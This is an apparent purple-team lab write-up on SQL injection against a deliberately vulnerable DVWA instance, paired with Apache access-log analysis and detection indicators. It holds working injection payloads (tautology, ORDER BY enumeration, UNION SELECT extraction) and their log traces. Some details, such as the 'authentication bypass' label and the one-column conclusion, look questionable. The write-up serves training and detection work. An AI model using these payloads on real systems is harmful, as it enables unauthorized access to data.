# 🔴 Phase 2: SQL Injection Attack & Log Analysis (Purple Team)

## 📌 Overview

In this phase, SQL Injection (SQLi) attacks were performed on the DVWA application to simulate real-world exploitation techniques. Simultaneously, web server logs were monitored to analyze how these attacks appear from a defender’s (SOC analyst) perspective.

This phase bridges the gap between **offensive security (attack execution)** and **defensive monitoring (log analysis)**.

---

## 🎯 Objectives

* Perform manual SQL Injection attacks
* Understand how SQL queries are manipulated
* Identify vulnerabilities in web applications
* Monitor Apache logs in real-time
* Detect attack patterns from logs

---

## 🧰 Tools & Environment

| Role       | Tool                  |
| ---------- | --------------------- |
| Attacker   | Kali Linux            |
| Target     | DVWA on Ubuntu Server |
| Monitoring | Apache access logs    |
| Method     | Manual SQL Injection  |

---

## ⚙️ Lab Preparation

### ✅ DVWA Configuration

* Logged into DVWA
* Set security level to:

  ```
  DVWA Security → LOW
  ```

---

### 🛡️ Log Monitoring Setup

On Ubuntu server:

```bash id="xv0qsn"
tail -f /var/log/apache2/access.log
```

This allows real-time observation of incoming requests.

---

## 🔴 Attack Execution

---

### 🧪 Attack 1: Authentication Bypass

**Payload:**

```id="v3qz8y"
1' OR '1'='1
```

---

### 🧠 Explanation

Original query:

```sql id="o6z36r"
SELECT * FROM users WHERE id = '1';
```

Injected query:

```sql id="b4jk5l"
SELECT * FROM users WHERE id = '1' OR '1'='1';
```

👉 Always evaluates TRUE → returns all records

---

### ✅ Result

* Multiple user records displayed
* Successful SQL Injection

---

### 🛡️ Log Evidence

```id="n3fw6y"
GET /dvwa/vulnerabilities/sqli/?id=1'%20OR%20'1'%3D'1 HTTP/1.1
```

---

### 🔍 Detection Insight

* Presence of `' OR`
* Logical bypass condition
* Highly suspicious input pattern

---

## 🧪 Attack 2: Column Enumeration

---

### Payloads:

```id="ck7dp7"
1' ORDER BY 1 --
1' ORDER BY 2 --
```

---

### ✅ Observation

* `ORDER BY 1` → Works
* `ORDER BY 2` → Error (HTTP 500)

---

### 🎯 Conclusion

* Number of columns = **1**

---

### 🛡️ Log Evidence

```id="9c8v7p"
ORDER BY 1
ORDER BY 2
```

---

### 🔍 Detection Insight

* Sequential probing pattern
* Common enumeration technique used by attackers

---

## 🧪 Attack 3: Data Extraction using UNION

---

### Payload:

```id="b0k6xp"
1' UNION SELECT database() --
```

---

### ✅ Result

* Database name displayed (`dvwa`)

---

### 🛡️ Log Evidence

```id="ksm7x4"
UNION SELECT database()
```

---

### 🔍 Detection Insight

* `UNION SELECT` is a strong SQL Injection indicator
* Used for extracting sensitive data

---

## 🧪 Attack 4: Extract Database User

---

### Payload:

```id="q2tfv1"
1' UNION SELECT user() --
```

---

### ✅ Result

* Displays current DB user (`dvwa@localhost`)

---

## 🧪 Attack 5: Extract Database Version

---

### Payload:

```id="4m31kb"
1' UNION SELECT version() --
```

---

### ✅ Result

* Displays MySQL version

---

## 🛡️ Log Analysis Summary

---

### 🔍 Observed Patterns

| Pattern        | Meaning               |
| -------------- | --------------------- |
| `' OR`         | Authentication bypass |
| `UNION SELECT` | Data extraction       |
| `ORDER BY`     | Column enumeration    |
| `%20`, `%27`   | URL encoding          |

---

### 📄 Sample Logs

```id="7y8c1u"
GET /dvwa/vulnerabilities/sqli/?id=1'%20OR%20'1'%3D'1
GET /dvwa/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%20database()
```

---

## 🧠 Attacker vs Defender Mapping

| Attacker Action   | Defender Observation |
| ----------------- | -------------------- |
| Inject payload    | Logged in access.log |
| Enumerate columns | ORDER BY sequence    |
| Extract data      | UNION SELECT usage   |

---

## ⚠️ Challenges Faced & Fixes

---

### ❌ 1. HTTP 500 Error during UNION

**Cause:**

* Incorrect column count in UNION query

**Fix:**

* Used `ORDER BY` to determine column count

---

### ❌ 2. Payload Not Displaying Output

**Cause:**

* Output column mismatch

**Fix:**

* Adjusted UNION payload to match visible column

---

### ❌ 3. URL Encoding Confusion

**Cause:**

* Logs showed encoded values (`%20`, `%27`)

**Fix:**

* Decoded values manually for analysis

---

## 🧠 Key Learnings

* SQL Injection relies on understanding query structure
* Even simple payloads can extract sensitive data
* Logs provide complete visibility of attacker behavior
* Manual analysis helps build detection intuition
* Attack patterns are easily identifiable with proper observation

> Note: IP addresses have been partially masked (192.168.0.xxx) for privacy while preserving attack patterns for analysis.
---

## 🏁 Conclusion

This phase successfully demonstrated how SQL Injection attacks are executed and how they appear in web server logs. It provides a strong foundation for transitioning into automated attacks and SIEM-based detection.

---
